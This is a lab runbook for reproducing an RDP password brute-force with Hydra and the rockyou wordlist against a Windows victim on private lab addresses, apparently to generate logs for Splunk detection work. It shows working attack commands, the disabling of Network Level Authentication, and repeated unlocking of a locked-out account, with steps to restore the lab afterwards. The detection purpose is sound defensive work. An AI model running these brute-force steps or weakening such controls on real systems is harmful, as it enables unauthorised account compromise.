# Attack Runbook — RDP Brute-Force (Windows Victim)

This document describes the exact steps used to reproduce the attack in this scenario, including two real obstacles encountered (NLA handshake failures and Windows' automatic account lockout) and how they were resolved.

**Attacker:** Kali Linux — `192.168.54.40`
**Target:** Windows victim — `192.168.54.20` (RDP, port 3389)
**Target account:** `khoa`

---

## 1. Enable RDP on the victim and confirm reachability

On the Windows victim: **Settings > System > Remote Desktop** → enable, then confirm the firewall rule:

```powershell
Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Select DisplayName, Enabled
```

From Kali:

```bash
nmap -p 3389 192.168.54.20
```

Expected: `3389/tcp open ms-wbt-server`.

## 2. First attempt — blocked by NLA

```bash
hydra -l khoa -P /usr/share/wordlists/rockyou.txt rdp://192.168.54.20
```

Result: repeated `[ERROR] all children were disabled due too many connection errors`. Root cause: Network Level Authentication (NLA) requires a full CredSSP handshake per attempt, which Hydra does not handle well, causing timeouts before any password is actually tested.

**Fix (lab-only — do not disable NLA on production systems):**

`sysdm.cpl` → Remote tab → uncheck *"Allow connections only from computers running Remote Desktop with Network Level Authentication"*.

## 3. Manual connection test (xfreerdp)

Used to isolate whether the issue was network/firewall or protocol-level:

```bash
xfreerdp /v:192.168.54.20 /u:khoa /cert:ignore
```

This succeeded in reaching the TLS/NLA layer (self-signed certificate warning is expected and safe to ignore in a lab). However, it revealed a second obstacle:

```
[ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_ACCOUNT_LOCKED_OUT [0x00020018]
```

**Root cause:** Windows' default Account Lockout Policy (locks an account after 10 failed attempts within 10 minutes) had already triggered from the earlier Hydra burst — an automatic, OS-level containment control that activated before any manual response.

**Unlock (lab-only, PowerShell as Administrator):**

```powershell
$user = [ADSI]"WinNT://./khoa"
$user.IsAccountLocked = $false
$user.SetInfo()
```

## 4. Re-run the attack

```bash
rm -f hydra.restore
hydra -l khoa -P /usr/share/wordlists/rockyou.txt -t 1 -V rdp://192.168.54.20
```

`-t 1` is required — RDP does not tolerate the parallelism SSH does. Each burst typically ran 7–13 attempts before the account locked again, producing five distinct attack bursts logged in Splunk.

## 5. Verify logs arrived in Splunk

```spl
index=wineventlog EventCode=4625
| table _time, host, Account_Name, Source_Network_Address, Logon_Type
```

## 6. Run the detection query

See [`spl-detection.md`](spl-detection.md) for the full SPL, including the `mvindex` fix for the multivalue `Account_Name` field, and the breach-verification query.

## 7. Restore lab state after testing

```powershell
# Re-enable NLA
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1

# Unlock the account if still locked
$user = [ADSI]"WinNT://./khoa"
$user.IsAccountLocked = $false
$user.SetInfo()
```
